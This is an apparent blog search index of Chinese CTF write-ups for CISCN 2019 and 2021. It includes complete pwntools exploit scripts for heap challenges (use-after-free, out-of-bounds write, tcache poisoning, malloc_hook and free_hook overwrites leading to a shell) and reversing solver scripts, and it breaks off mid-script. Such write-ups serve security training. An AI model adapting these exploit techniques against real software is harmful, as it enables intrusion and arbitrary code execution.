<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CISCN_2019</title>
    <url>/article/CISCN_2019/</url>
    <content><![CDATA[<h1 id="CISCN-2019"><a href="#CISCN-2019" class="headerlink" title="CISCN_2019"></a>CISCN_2019</h1><span id="more"></span>

<h1 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h1><p>保护</p>
<p><img src="/article/CISCN_2019/image-20210526120532732.png" alt="image-20210526120532732"></p>
<p>ida</p>
<ul>
<li>new</li>
</ul>
<p><img src="/article/CISCN_2019/image-20210526121417172.png" alt="image-20210526121417172"></p>
<ul>
<li><p>del</p>
<p><img src="/article/CISCN_2019/image-20210526121954287.png" alt="image-20210526121954287"></p>
</li>
<li><p>dump</p>
<p><img src="/article/CISCN_2019/image-20210526122032820.png" alt="image-20210526122032820"></p>
</li>
</ul>
<h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>uaf漏洞。程序new之前先malloc了0xC的chunk，用来存放 print 和 free 指针</p>
<ul>
<li>1、直接写入数值</li>
<li>2、写入一个指向string的chunk指针</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/article/CISCN_2019/image-20210526123328831.png" alt="image-20210526123328831"></p>
<p>根据 fastbin FILO 的特性，执行 free(0)、free(1) ，再new一个string类型，便可以修改 free 指针为 system_plt，同时 string 指针的最后一个字节会被修改为 \n (0x0a)，就刚好指向了 print 指针处，把这个地方修改为 bash。执行 free(0) -&gt; system(‘bash’)，达成getshell</p>
<p><img src="/article/CISCN_2019/image-20210526124650393.png" alt="image-20210526124650393"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26908</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,12345)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="type">Type</span>,content,length=<span class="number">0</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="type">Type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="type">Type</span> == <span class="number">2</span>:        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Value &gt; &#x27;</span>,<span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="string">&#x27;bash&#x27;</span>+p32(sys_addr),<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>CISCN_2021</title>
    <url>/article/CISCN_2021/</url>
    <content><![CDATA[<h1 id="CISCN-2021"><a href="#CISCN-2021" class="headerlink" title="CISCN_2021"></a>CISCN_2021</h1><span id="more"></span>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwny"><a href="#pwny" class="headerlink" title="pwny"></a>pwny</h2><p>保护全开</p>
<p><img src="/article/CISCN_2021/image-20210517194723531.png" alt="image-20210517194723531"></p>
<p>IDA</p>
<ul>
<li>main</li>
</ul>
<p><img src="/article/CISCN_2021/image-20210517194740860.png" alt="image-20210517194740860"></p>
<ul>
<li>read</li>
</ul>
<p><img src="/article/CISCN_2021/image-20210602204007319.png" alt="image-20210602204007319"></p>
<ul>
<li>write</li>
</ul>
<p><img src="/article/CISCN_2021/image-20210602204021587.png" alt="image-20210602204021587"></p>
<p>write 的时候可以数组越界，输入256，第一次读入到 0x202860 处使fd非法，第二次读入时写入0，这样即可做写入操作</p>
<p><img src="/article/CISCN_2021/image-20210602204121951.png" alt="image-20210602204121951"></p>
<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>利用数组溢出，实现任意地址读写。</p>
<ul>
<li>输入两次 0x100，数组越界，让 fd 置零</li>
<li>leak libc </li>
<li>当scanf读取长度超过0x400的数据时会调用 malloc_hook ，所以我们可以修改 malloc_hook 指向 realloc + n , realloc 指向 one_gadget</li>
</ul>
<h3 id="1、fd-置零"><a href="#1、fd-置零" class="headerlink" title="1、fd 置零"></a>1、fd 置零</h3><p>用vmmap 看 bss 段</p>
<p>第二次read((unsigned __int8)random_fd, &amp;input, 8uLL)的时候fd是无效值，整个read是无效操作，input还是0，之后又赋值给了array[0x100]（即fd）</p>
<p><img src="/article/CISCN_2021/image-20210517195700168.png" alt="image-20210517195700168"></p>
<p><img src="/article/CISCN_2021/image-20210517195801362.png" alt="image-20210517195801362"></p>
<h3 id="2、leak-libc"><a href="#2、leak-libc" class="headerlink" title="2、leak libc"></a>2、leak libc</h3><p><img src="/article/CISCN_2021/image-20210602204143302.png" alt="image-20210602204143302"></p>
<p>0x202060 - 0x202040 = 0x20 = 32 ，32/8 = 4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>)) <span class="comment"># -4</span></span><br></pre></td></tr></table></figure>



<h3 id="3、计算数组addr"><a href="#3、计算数组addr" class="headerlink" title="3、计算数组addr"></a>3、计算数组addr</h3><p><img src="/article/CISCN_2021/image-20210602204433065.png" alt="image-20210602204433065"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))<span class="comment"># -11</span></span><br></pre></td></tr></table></figure>



<h3 id="4、修改hook"><a href="#4、修改hook" class="headerlink" title="4、修改hook"></a>4、修改hook</h3><p>修改 malloc_hook 指向 realloc + n , realloc 指向 one_gadget</p>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 pro</span></span><br><span class="line"><span class="comment"># 2 remote</span></span><br><span class="line"><span class="comment"># 3 127</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span> :</span><br><span class="line">    p = process(<span class="string">&#x27;./pwny&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29811</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">3</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">12345</span>)</span><br><span class="line">    <span class="comment">#23946 12345</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Index: &#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2</span>(<span class="params">index,addr</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.send(addr)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFFC</span>)) <span class="comment"># -4</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">stderr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = stderr - libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:0x%x&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">read(p64(<span class="number">0xFFFFFFFFFFFFFFF5</span>))<span class="comment"># -11</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Result: &#x27;</span>)</span><br><span class="line">bss = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>,<span class="number">0xe546f</span>,<span class="number">0xe5617</span>,<span class="number">0xe561e</span>,<span class="number">0xe5622</span>,<span class="number">0x10a428</span>]</span><br><span class="line">one = one_gadget[<span class="number">1</span>] + libc_base</span><br><span class="line"></span><br><span class="line">offset1 = (libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - (bss + <span class="number">0x58</span> + <span class="number">8</span>))/<span class="number">8</span></span><br><span class="line">offset2 = (libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - (bss + <span class="number">0x58</span>))/<span class="number">8</span></span><br><span class="line">realloc_off = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">write2(offset2,p64(libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>] + realloc_off))</span><br><span class="line">write2(offset1,p64(one))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;5&#x27;</span> * <span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="longlywolf"><a href="#longlywolf" class="headerlink" title="longlywolf"></a>longlywolf</h2><p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;lonelywolf&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;124.71.230.240&quot;,&quot;26077&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;lonelywolf&quot;</span>).libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment"># in tcache_head add chunk (without head)      </span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0x0801010000000000</span>) + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(heap+<span class="number">0x250</span>) + p64(heap+<span class="number">0x260</span>))</span><br><span class="line"><span class="comment"># 0x90 0x80 0x70</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x70 0x80</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#add chunk (without head)</span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#edit chunk size,and overlapping next chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment"># add a nobody chunk</span></span><br><span class="line"></span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># edit </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment"># tcache chunk_addr</span></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">edit(p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;12345678&#x27;</span></span><br><span class="line">b=[]</span><br><span class="line">c=[<span class="number">0xa3</span>,<span class="number">0x1a</span>,<span class="number">0xe3</span>,<span class="number">0x69</span>,<span class="number">0x2f</span>,<span class="number">0xbb</span>,<span class="number">0x1a</span>,<span class="number">0x84</span>,<span class="number">0x65</span>,<span class="number">0xc2</span>,<span class="number">0xad</span>,<span class="number">0xad</span>,<span class="number">0x9e</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x2</span>,<span class="number">0x1f</span>,<span class="number">0x8e</span>,<span class="number">0x36</span>,<span class="number">0x4f</span>,<span class="number">0xe1</span>,<span class="number">0xeb</span>,<span class="number">0xaf</span>,<span class="number">0xf0</span>,<span class="number">0xea</span>,<span class="number">0xc4</span>,<span class="number">0xa8</span>,<span class="number">0x2d</span>,<span class="number">0x42</span>,<span class="number">0xc7</span>,<span class="number">0x6e</span>,<span class="number">0x3f</span>,<span class="number">0xb0</span>,<span class="number">0xd3</span>,<span class="number">0xcc</span>,<span class="number">0x78</span>,<span class="number">0xf9</span>,<span class="number">0x98</span>,<span class="number">0x3f</span>]</span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b.append(i)</span><br><span class="line"></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    g=b[i]</span><br><span class="line">    n=(n+g+<span class="built_in">ord</span>(a[i%<span class="number">8</span>]))%<span class="number">256</span></span><br><span class="line">    b[i]=b[n]</span><br><span class="line">    b[n]=g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    c[i]=c[i]^<span class="built_in">ord</span>(a[i%<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">3</span>):</span><br><span class="line">    c[<span class="number">3</span>*i+<span class="number">1</span>]=c[<span class="number">3</span>*i+<span class="number">1</span>]^c[<span class="number">3</span>*i]</span><br><span class="line">    c[<span class="number">3</span>*i+<span class="number">2</span>]=c[<span class="number">3</span>*i+<span class="number">1</span>]^c[<span class="number">3</span>*i+<span class="number">2</span>]</span><br><span class="line">    c[<span class="number">3</span>*i]=c[<span class="number">3</span>*i+<span class="number">2</span>]^c[<span class="number">3</span>*i]</span><br><span class="line"></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">m=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    n=(n+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    g=b[n]</span><br><span class="line">    m=(m+g)%<span class="number">256</span></span><br><span class="line">    b[n]=b[m]</span><br><span class="line">    b[m]=g</span><br><span class="line">    c[i]^=b[(g+b[n])%<span class="number">256</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="babybc"><a href="#babybc" class="headerlink" title="babybc"></a>babybc</h2><p>用到 LLVM，再IDA打开</p>
<p>两个函数，写了各种限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">横</span><br><span class="line">row 0001 1000 2001 0000 1010</span><br><span class="line">map[0][3] &gt; map[0][4]</span><br><span class="line">map[1][0] &gt; map[1][1]</span><br><span class="line">map[2][0] &lt; map[2][1]</span><br><span class="line">map[2][3] &gt; map[2][4]</span><br><span class="line">map[4][0] &gt; map[4][1]</span><br><span class="line">map[4][2] &gt; map[4][3]</span><br><span class="line"></span><br><span class="line">纵</span><br><span class="line">col 00202 00000 00010 01001</span><br><span class="line">map[0][2] &gt; map[1][2]</span><br><span class="line">map[0][4] &gt; map[1][4]</span><br><span class="line">map[2][3] &lt; map[3][3]</span><br><span class="line">map[3][1] &lt; map[4][1]</span><br><span class="line">map[3][4] &lt; map[4][3]</span><br></pre></td></tr></table></figure>

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = []</span><br><span class="line">num2 = []</span><br><span class="line">num3 = []</span><br><span class="line">num4 = []</span><br><span class="line">num5 = []</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span>(i2 == i1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span>(i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span>(i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3  <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span>(i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4 <span class="keyword">or</span> i4 &lt;= i5):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num1.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i2 &gt;= i1 <span class="keyword">or</span> i2 == <span class="number">5</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 == <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 <span class="keyword">or</span> i4 == <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                                <span class="keyword">if</span> (i5 == i1 <span class="keyword">or</span> i5 == i2 <span class="keyword">or</span> i5 == i3 <span class="keyword">or</span> i5 ==i4):</span><br><span class="line">                                    <span class="keyword">continue</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = []</span><br><span class="line">                                    index.append(i1)</span><br><span class="line">                                    index.append(i2)</span><br><span class="line">                                    index.append(i3)</span><br><span class="line">                                    index.append(i4)</span><br><span class="line">                                    index.append(i5)</span><br><span class="line">                                    num2.append(index)</span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> (i2 == i1 <span class="keyword">or</span> i1 &gt;= i2):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                <span class="keyword">if</span> (i3 == i1 <span class="keyword">or</span> i3 == i2 <span class="keyword">or</span> i3 != <span class="number">4</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">                        <span class="keyword">if</span> (i4 == i1 <span class="keyword">or</span> i4 == i2 <span class="keyword">or</span> i4 == i3 